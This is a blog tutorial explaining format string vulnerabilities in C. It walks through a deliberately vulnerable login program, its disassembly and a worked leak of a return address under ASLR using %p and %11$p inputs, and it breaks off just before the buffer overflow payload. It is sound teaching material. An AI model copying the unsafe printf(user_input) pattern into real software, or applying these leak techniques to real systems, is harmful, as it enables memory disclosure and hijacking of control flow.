---
title:  "Format String Vulnerability"
date:   2025-12-10
categories: ["reverse engineering"]
tags: ["vulnerabilities","format string", "buffer overflow","reverse engineering"]
author: Sanketh
references:

---

# Format String Vulnerabilities

## Why Information Leaks Matter in Modern Exploitation

### The ASLR Problem

Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

- Stack addresses change every execution
- Heap addresses randomized
- Library (libc) addresses randomized
- Code addresses randomized (with PIE)

**The dilemma:**

- You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
- But you don't know WHERE to point it (shellcode location unknown)
- Even ROP gadget addresses are randomized
- You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives.

## Format Strings in C

Format strings are used by functions like `printf`, `sprintf`, `fprintf` to format output with placeholders. These are not simple string printers. They are mini interpreters.

Example

```c
printf("x = %d, y = %d\n", x, y);
```

Here:
`"x = %d, y = %d\n"` is not data It is a program that tells printf:

1.	Print literal text `x = `
2.	Fetch an integer argument → print it as decimal
3.	Print , `y = `
4.	Fetch another integer argument → print it
5.	Print newline

So: A format string is instructions for how to consume arguments and produce output.

### Common format specifiers

```
| Specifier | Meaning  | How argument is interpreted |
| --------- | -------- | --------------------------- |
| `%d`      | decimal  | `int`                       |
| `%u`      | unsigned | `unsigned int`              |
| `%x`      | hex      | `unsigned int`              |
| `%p`      | pointer  | `void*`                     |
| `%s`      | string   | pointer → dereference       |
| `%c`      | char     | integer → cast              |
| `%f`      | float    | double (promotion rules)    |
| `%n`      | Write count to memory | (no output)    |
```

We can also pass width, precision, and modifiers

```
%08x
%.3f
%10s
%lld
```

These don’t change where data comes from — they change how it’s formatted.


### How printf actually processes arguments?

```
arg_ptr = start_of_arguments;

for each character in format_string:
    if character != '%':
        print(character)
    else:
        specifier = parse_specifier()
        value = *arg_ptr
        arg_ptr++
        print(value according to specifier)
```

We can. see what’s missing:

- No check that `arg_ptr` is valid
- No check that caller provided enough arguments
- No type safety



### Variadic functions: the critical design choice

```c
int printf(const char *fmt, ...);
```

This means:
	•	The compiler does not know how many arguments are passed
	•	Only the format string tells printf how many arguments exist
	•	There is no runtime verification

So `printf` blindly trusts the format string. This is not a bug — it’s how C was designed.

#### Where do the arguments come from?

In 32-bit x86 all arguments of `printf` will be on stack.


**Stack layout:**
```
High addresses
┌─────────────────┐
│ arg3            │
├─────────────────┤
│ arg2            │
├─────────────────┤
│ arg1            │
├─────────────────┤
│ format string   │ ← printf's first argument
├─────────────────┤
│ return address  │
└─────────────────┘
Low addresses
```

64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):

```
- RDI = 1st argument (format string)
- RSI = 2nd argument
- RDX = 3rd argument
- RCX = 4th argument
- R8  = 5th argument
- R9  = 6th argument
- Stack = 7th argument onwards

```

This doesn't change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values. 

## The Vulnerability: User Input as Format String

The critical mistake is passing user input as a format string.

```c
char user_input[100];
fgets(user_input, sizeof(user_input), stdin);

// DANGEROUS: User input used directly as format string
printf(user_input);
```

**Why this is dangerous:**

- User controls the format string
- User can inject format specifiers like `%x`, `%s`, `%n`
- These specifiers will read or write memory without authorization
- Can lead to information disclosure or arbitrary code execution

### Sample Program With Vulnerability

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	char password[8];
    char username[8];
	int  isAuthenticated = 0;

    printf("Enter Username: ");
	scanf("%s", username);

	printf("Enter password for: ");
    printf(username);
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB. 

```c
    printf(username);
```

This is the line which allows us to exploit format string vulnerability. A safe version would've been

```c
    printf("%s", username);
```

We still need to disable stackguard as our attack is based on buffer overflow

```bash
$ gcc -fno-stack-protector  -O0 -o vuln  main.c
main.c: In function ‘AuthenticateUser’:
main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security]
   26 |          printf(username);
      |                 ^~~~~~~~
```

We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively. 

Let's look at the assembly of `AuthenticateUser` function to confirm the vulenrability 

```bash
$ objdump -d -M intel,mnemonic,no-att -j .text vuln

00000000000011fe <AuthenticateUser>:
    11fe:	f3 0f 1e fa          	endbr64
    1202:	55                   	push   rbp
    1203:	48 89 e5             	mov    rbp,rsp
    1206:	48 83 ec 20          	sub    rsp,0x20
    120a:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
    1211:	48 8d 05 04 0e 00 00 	lea    rax,[rip+0xe04]        # 201c <_IO_stdin_used+0x1c>
    1218:	48 89 c7             	mov    rdi,rax
    121b:	b8 00 00 00 00       	mov    eax,0x0
    1220:	e8 6b fe ff ff       	call   1090 <printf@plt>
    1225:	48 8d 45 f0          	lea    rax,[rbp-0x10]
    1229:	48 89 c6             	mov    rsi,rax
    122c:	48 8d 05 fa 0d 00 00 	lea    rax,[rip+0xdfa]        # 202d <_IO_stdin_used+0x2d>
    1233:	48 89 c7             	mov    rdi,rax
    1236:	b8 00 00 00 00       	mov    eax,0x0
    123b:	e8 70 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1240:	48 8d 05 e9 0d 00 00 	lea    rax,[rip+0xde9]        # 2030 <_IO_stdin_used+0x30>
    1247:	48 89 c7             	mov    rdi,rax
    124a:	b8 00 00 00 00       	mov    eax,0x0
    124f:	e8 3c fe ff ff       	call   1090 <printf@plt>
    1254:	48 8d 45 f0          	lea    rax,[rbp-0x10]
    1258:	48 89 c7             	mov    rdi,rax
    125b:	b8 00 00 00 00       	mov    eax,0x0
    1260:	e8 2b fe ff ff       	call   1090 <printf@plt>
    1265:	48 8d 45 f8          	lea    rax,[rbp-0x8]
    1269:	48 89 c6             	mov    rsi,rax
    126c:	48 8d 05 ba 0d 00 00 	lea    rax,[rip+0xdba]        # 202d <_IO_stdin_used+0x2d>
    1273:	48 89 c7             	mov    rdi,rax
    1276:	b8 00 00 00 00       	mov    eax,0x0
    127b:	e8 30 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1280:	48 8d 55 ec          	lea    rdx,[rbp-0x14]
    1284:	48 8d 45 f8          	lea    rax,[rbp-0x8]
    1288:	48 89 d6             	mov    rsi,rdx
    128b:	48 89 c7             	mov    rdi,rax
    128e:	e8 30 ff ff ff       	call   11c3 <checkPassword>
    1293:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
    1296:	83 f8 01             	cmp    eax,0x1
    1299:	75 0c                	jne    12a7 <AuthenticateUser+0xa9>
    129b:	b8 00 00 00 00       	mov    eax,0x0
    12a0:	e8 04 ff ff ff       	call   11a9 <grantAccess>
    12a5:	eb 0f                	jmp    12b6 <AuthenticateUser+0xb8>
    12a7:	48 8d 05 97 0d 00 00 	lea    rax,[rip+0xd97]        # 2045 <_IO_stdin_used+0x45>
    12ae:	48 89 c7             	mov    rdi,rax
    12b1:	e8 ca fd ff ff       	call   1080 <puts@plt>
    12b6:	90                   	nop
    12b7:	c9                   	leave
    12b8:	c3                   	ret
```

We know the calling convention is to place first parameter in `rdi` and second parameter in `rsi`.

We can see in the first two `printf` calls, the value in `rdi` is taken from `.rodata` section. It uses RIP relative addressing here to point to the address of the hardcoded format strings. 

```bash
    122c:	48 8d 05 fa 0d 00 00 	lea    rax,[rip+0xdfa]        # 202d <_IO_stdin_used+0x2d>
    1233:	48 89 c7             	mov    rdi,rax
    1236:	b8 00 00 00 00       	mov    eax,0x0
    123b:	e8 70 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1240:	48 8d 05 e9 0d 00 00 	lea    rax,[rip+0xde9]        # 2030 <_IO_stdin_used+0x30>
    1247:	48 89 c7             	mov    rdi,rax
    124a:	b8 00 00 00 00       	mov    eax,0x0
    124f:	e8 3c fe ff ff       	call   1090 <printf@plt>
```

But in the third `printf`

```bash
    1254:	48 8d 45 a0          	lea    rax,[rbp-0x10]
    1258:	48 89 c7             	mov    rdi,rax
    125b:	b8 00 00 00 00       	mov    eax,0x0
    1260:	e8 2b fe ff ff       	call   1090 <printf@plt>
```

We can see the adress written to `rdi` is relative to `rbp` which means its clearly on the stack and its the address of the `username` variable.


### Exploit 1: Leak the Stack Adresses and Relace the Return Address of `AuthenticateUser` to `grantAccess`

Let's visualize the stack layout:

```
1206:	sub    rsp,0x20           # Allocate 32 bytes (0x20)
120a:	mov    DWORD PTR [rbp-0x14],0x0    # isAuthenticated
1225:	lea    rax,[rbp-0x10]              # username
1265:	lea    rax,[rbp-0x8]               # password
```

**Stack layout:**
```
Higher addresses
┌──────────────────────┐
│ Return address       │ ← [rbp+8]  (0x12cb - points to main)
│ (0x55...12cb)        │    **WE WANT TO OVERWRITE THIS!**
├──────────────────────┤
│ Saved RBP            │ ← [rbp]    (8 bytes)
├──────────────────────┤
│ password[8]          │ ← [rbp-0x8]  (8 bytes from RBP)
├──────────────────────┤
│ username[8]          │ ← [rbp-0x10] (16 bytes from RBP)
├──────────────────────┤
│ isAuthenticated (4)  │ ← [rbp-0x14] (20 bytes from RBP)
├──────────────────────┤
│ padding (12 bytes)   │ ← [rbp-0x20] (unused, stack aligned)
└──────────────────────┘
Lower addresses
```

Total stack frame: 32 bytes (0x20)

#### Calculating Key Distances

##### 1. Distance of Password From Saved RA 

This is what we need to leak with format string vulnerability and overwrite it later

- username at `[rbp-0x10]`
- password at `[rbp-0x8]`
- return address at `[rbp+8]`
- Distance from username to return address: `0x10 + 8 = 24 bytes`
- Distance from password to return address: `0x8 + 8 = 16 bytes`

##### 2. The Actual Address of `grantAccess`

This is where we need to jump to using buffer overflow and the previous information leaked. 

Now lets calculate the address of `grantAccess`: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of `grantAccess` function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in `.text` section remains same. 



```
00000000000012b9 <main>:
    12b9:	f3 0f 1e fa          	endbr64
    12bd:	55                   	push   rbp
    12be:	48 89 e5             	mov    rbp,rsp
    12c1:	b8 00 00 00 00       	mov    eax,0x0
    12c6:	e8 33 ff ff ff       	call   11fe <AuthenticateUser>
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -> this is the return address of AuthenticateUser
    12d0:	5d                   	pop    rbp 
    12d1:	c3                   	ret
```

```
Return address (leaked): 0x12cb
grantAccess:            0x11a9
Offset:                 0x12cb - 0x11a9 = 0x122 (290 bytes)
```

Since we would've already leaked the return address in `main` using format string in our previous step, 
we can add this offset of 290 bytes to get the actual address of `grantAccess`. 

##### 3. Correct Argument to Leak From `printf`

When we call printf:

```
call printf
```

Inside printf's perspective:

```
Position 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers)
Position 7:   [rsp]      ← First stack parameter
Position 8:   [rsp+8]    ← Second stack parameter
Position 9:   [rsp+16]   ← Third stack parameter
Position 10:  [rsp+24]
etc.
```

What the Compiler Generates:

```
# Caller (before call printf):
push arg8          # Push in reverse order
push arg7
mov r9, arg6       # Load registers
mov r8, arg5
mov rcx, arg4
mov rdx, arg3
mov rsi, arg2
mov rdi, arg1
call printf        # Now RSP points right at arg7!

# After printf returns:
add rsp, 16        # Clean up the 2 stack args (arg7, arg8)
```

Since callee is passing the variadic arguments, it will be located on the stack before the `printf`'s stack frame is set up. 

This is the stack frame just before `printf` is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf's prologue has not been executed yet. Since the variadic argument `va_list` is already present on stack, we can guarantee that `printf`'s `arg_ptr` starts scanning arguments from there and the actual stack frame of `printf` doesn't even matter. 

```
Higher addresses
┌──────────────────────┐
│ Return to main       │  ← AuthenticateUser return addr (TARGET)
├──────────────────────┤
│ Saved RBP            │
├──────────────────────┤
│ password[8]          │
├──────────────────────┤
│ username[8]          │
├──────────────────────┤
│ isAuthenticated +    │
│ padding              │
├──────────────────────┤
│ va_list              │  ← printf's arg_ptr starts, here, it will look like [rbp+8] in printf's assembly
├──────────────────────┤
│ return address to.   |
| AuthenticateUser.    │  ← [rsp] of AuthenticateUser 
└──────────────────────┘
Lower addresses
```

By looking at the [stack](#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess) we built previously. We can see we ened to move the `printf`'s `arg_ptr` 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string. 

We can use `%p` to print the addresses with `0x` prefix. If we add `%p` 11 times, we will leak the 11th argument. 

```bash
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffded20f2c0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffeb89c1e40(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffe874444d0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffd4ef49d80(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C
```

We can see even with ASLR, our return address consistenly ends with `2cb`. In fact even the static address on binary showed the address ending with `2cb`. 

```
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -> this is the return address of AuthenticateUser
```

The important observation here is, the last 3 nibbles remains unchanged even after ASLR!

Its because of the page alignment
•	Page size = `4096 bytes` = `0x1000`
•	That means the lowest 12 bits are always zero

So the constant offset ASLR will be adding has to be a multiple of `4096` which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments. 

We can use this as to double confirm we're headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits. 

Sometimes we may not have space to tpe enough `%p`'s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input

```bash
Enter Username: %11$p
Enter password for: 0x5a45b5b602cb
```

This will directly take us to the 11th parameter.

### Building the Payload for Buffer Overflow
